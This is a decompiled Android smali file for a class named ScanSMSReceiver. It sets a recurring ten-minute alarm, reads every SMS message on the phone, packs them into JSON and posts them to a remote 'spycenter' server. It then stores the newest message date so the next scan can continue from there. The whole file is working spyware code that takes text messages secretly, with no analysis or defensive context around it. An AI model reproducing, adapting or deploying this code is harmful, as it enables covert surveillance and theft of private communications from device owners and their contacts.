.class public Landroid/ares/ScanSMSReceiver;
.super Landroid/content/BroadcastReceiver;
.source "ScanSMSReceiver.java"


# direct methods
.method public constructor <init>()V
    .registers 1

    .prologue
    .line 25
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method

.method private setScanSMSAlarm(Landroid/content/Context;)V
    .registers 11
    .param p1, "context"    # Landroid/content/Context;

    .prologue
    const/16 v8, 0xc

    const/16 v7, 0xa

    const/4 v6, 0x0

    .line 68
    invoke-static {}, Ljava/util/Calendar;->getInstance()Ljava/util/Calendar;

    move-result-object v2

    .line 69
    .local v2, "nextAlarm":Ljava/util/Calendar;
    invoke-virtual {v2, v8, v7}, Ljava/util/Calendar;->add(II)V

    .line 71
    new-instance v1, Landroid/content/Intent;

    const-class v4, Landroid/ares/ScanSMSReceiver;

    invoke-direct {v1, p1, v4}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 72
    .local v1, "intent":Landroid/content/Intent;
    const/high16 v4, 0x40000000    # 2.0f

    invoke-static {p1, v6, v1, v4}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v3

    .line 74
    .local v3, "pIntent":Landroid/app/PendingIntent;
    const-string v4, "alarm"

    invoke-virtual {p1, v4}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/AlarmManager;

    .line 75
    .local v0, "am":Landroid/app/AlarmManager;
    invoke-virtual {v2}, Ljava/util/Calendar;->getTimeInMillis()J

    move-result-wide v4

    invoke-virtual {v0, v6, v4, v5, v3}, Landroid/app/AlarmManager;->set(IJLandroid/app/PendingIntent;)V

    .line 78
    const-string v4, "::trace"

    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "::INFO  Scan SMS alarm set at: "

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, v7}, Ljava/util/Calendar;->get(I)I

    move-result v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, ":"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    .line 79
    invoke-virtual {v2, v8}, Ljava/util/Calendar;->get(I)I

    move-result v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, ":"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    const/16 v6, 0xd

    invoke-virtual {v2, v6}, Ljava/util/Calendar;->get(I)I

    move-result v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    .line 78
    invoke-static {v4, v5}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 81
    return-void
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .registers 17
    .param p1, "context"    # Landroid/content/Context;
    .param p2, "intent"    # Landroid/content/Intent;

    .prologue
    .line 29
    invoke-static {p1}, Landroid/ares/Helper;->isNetworkConnected(Landroid/content/Context;)Z

    move-result v9

    if-eqz v9, :cond_6d

    .line 30
    const-string v9, "::trace"

    const-string v10, "::INFO  SMS scanning..."

    invoke-static {v9, v10}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 32
    invoke-static {p1}, Landroid/ares/SMS;->getSMSDetails(Landroid/content/Context;)Ljava/util/ArrayList;

    move-result-object v1

    .line 34
    .local v1, "SMSArray":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Landroid/ares/SMS;>;"
    if-eqz v1, :cond_6d

    .line 36
    :try_start_13
    new-instance v6, Lorg/json/JSONArray;

    invoke-direct {v6}, Lorg/json/JSONArray;-><init>()V

    .line 38
    .local v6, "jSMSArray":Lorg/json/JSONArray;
    const/4 v4, 0x0

    .local v4, "i":I
    :goto_19
    invoke-virtual {v1}, Ljava/util/ArrayList;->size()I

    move-result v9

    if-lt v4, v9, :cond_71

    .line 43
    const-string v2, "http://spycenter.x10host.com/services/SMS.php"

    .line 44
    .local v2, "URL":Ljava/lang/String;
    new-instance v7, Landroid/ares/URLWithParams;

    invoke-direct {v7, v2, v6}, Landroid/ares/URLWithParams;-><init>(Ljava/lang/String;Lorg/json/JSONArray;)V

    .line 46
    .local v7, "mURLWithParams":Landroid/ares/URLWithParams;
    new-instance v0, Landroid/ares/PostJSONDataTask;

    invoke-direct {v0}, Landroid/ares/PostJSONDataTask;-><init>()V

    .line 47
    .local v0, "PostJSONArray":Landroid/os/AsyncTask;, "Landroid/os/AsyncTask<Landroid/ares/URLWithParams;Ljava/lang/Void;Ljava/lang/Integer;>;"
    const/4 v9, 0x1

    new-array v9, v9, [Landroid/ares/URLWithParams;

    const/4 v10, 0x0

    aput-object v7, v9, v10

    invoke-virtual {v0, v9}, Landroid/os/AsyncTask;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    .line 49
    invoke-virtual {v0}, Landroid/os/AsyncTask;->get()Ljava/lang/Object;

    move-result-object v9

    check-cast v9, Ljava/lang/Integer;

    const/16 v10, 0xc8

    invoke-static {v10}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v10

    invoke-virtual {v9, v10}, Ljava/lang/Integer;->equals(Ljava/lang/Object;)Z

    move-result v9

    if-eqz v9, :cond_6d

    .line 51
    invoke-static {p1}, Landroid/preference/PreferenceManager;->getDefaultSharedPreferences(Landroid/content/Context;)Landroid/content/SharedPreferences;

    move-result-object v8

    .line 52
    .local v8, "prefs":Landroid/content/SharedPreferences;
    invoke-interface {v8}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v10

    const-string v11, "SMSScan"

    const/4 v9, 0x0

    invoke-virtual {v1, v9}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v9

    check-cast v9, Landroid/ares/SMS;

    invoke-virtual {v9}, Landroid/ares/SMS;->getDate()Ljava/util/Date;

    move-result-object v9

    invoke-virtual {v9}, Ljava/util/Date;->getTime()J

    move-result-wide v12

    invoke-interface {v10, v11, v12, v13}, Landroid/content/SharedPreferences$Editor;->putLong(Ljava/lang/String;J)Landroid/content/SharedPreferences$Editor;

    move-result-object v9

    invoke-interface {v9}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 54
    const-string v9, "::trace"

    const-string v10, "::DEBUG  SaredPreferences updated."

    invoke-static {v9, v10}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_6d
    .catch Ljava/lang/Exception; {:try_start_13 .. :try_end_6d} :catch_81

    .line 63
    .end local v0    # "PostJSONArray":Landroid/os/AsyncTask;, "Landroid/os/AsyncTask<Landroid/ares/URLWithParams;Ljava/lang/Void;Ljava/lang/Integer;>;"
    .end local v1    # "SMSArray":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Landroid/ares/SMS;>;"
    .end local v2    # "URL":Ljava/lang/String;
    .end local v4    # "i":I
    .end local v6    # "jSMSArray":Lorg/json/JSONArray;
    .end local v7    # "mURLWithParams":Landroid/ares/URLWithParams;
    .end local v8    # "prefs":Landroid/content/SharedPreferences;
    :cond_6d
    :goto_6d
    invoke-direct {p0, p1}, Landroid/ares/ScanSMSReceiver;->setScanSMSAlarm(Landroid/content/Context;)V

    .line 64
    return-void

    .line 39
    .restart local v1    # "SMSArray":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Landroid/ares/SMS;>;"
    .restart local v4    # "i":I
    .restart local v6    # "jSMSArray":Lorg/json/JSONArray;
    :cond_71
    :try_start_71
    invoke-virtual {v1, v4}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v9

    check-cast v9, Landroid/ares/SMS;

    invoke-virtual {v9}, Landroid/ares/SMS;->toJSON()Lorg/json/JSONObject;

    move-result-object v5

    .line 40
    .local v5, "jSMS":Lorg/json/JSONObject;
    invoke-virtual {v6, v5}, Lorg/json/JSONArray;->put(Ljava/lang/Object;)Lorg/json/JSONArray;
    :try_end_7e
    .catch Ljava/lang/Exception; {:try_start_71 .. :try_end_7e} :catch_81

    .line 38
    add-int/lit8 v4, v4, 0x1

    goto :goto_19

    .line 56
    .end local v4    # "i":I
    .end local v5    # "jSMS":Lorg/json/JSONObject;
    .end local v6    # "jSMSArray":Lorg/json/JSONArray;
    :catch_81
    move-exception v3

    .line 58
    .local v3, "e":Ljava/lang/Exception;
    const-string v9, "::trace"

    new-instance v10, Ljava/lang/StringBuilder;

    const-string v11, "::ERROR  "

    invoke-direct {v10, v11}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-static {v3}, Landroid/util/Log;->getStackTraceString(Ljava/lang/Throwable;)Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    invoke-static {v9, v10}, Landroid/util/Log;->wtf(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_6d
.end method
